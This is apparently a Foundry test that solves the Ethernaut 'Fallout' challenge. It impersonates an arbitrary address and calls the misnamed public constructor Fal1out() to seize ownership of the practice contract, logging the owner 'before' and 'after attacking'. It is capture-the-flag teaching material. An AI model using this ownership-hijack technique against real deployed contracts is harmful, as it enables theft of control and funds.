// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Fallout.sol";
import "forge-std/console.sol";

contract CounterTest is Test {
    Fallout public falloutContract;

    function setUp() public {
        falloutContract = new Fallout();
    }

    function test_ClaimingOwnership() public {
        address someRandomUser = vm.addr(1);
        vm.startPrank(someRandomUser);
        console.log("owner before attacking : ", falloutContract.owner());
        falloutContract.Fal1out();
        console.log("owner after attacking : ", falloutContract.owner());
        assertEq(
            uint256(uint160(falloutContract.owner())),
            uint256(uint160(someRandomUser))
        );
        vm.stopPrank();
    }
}
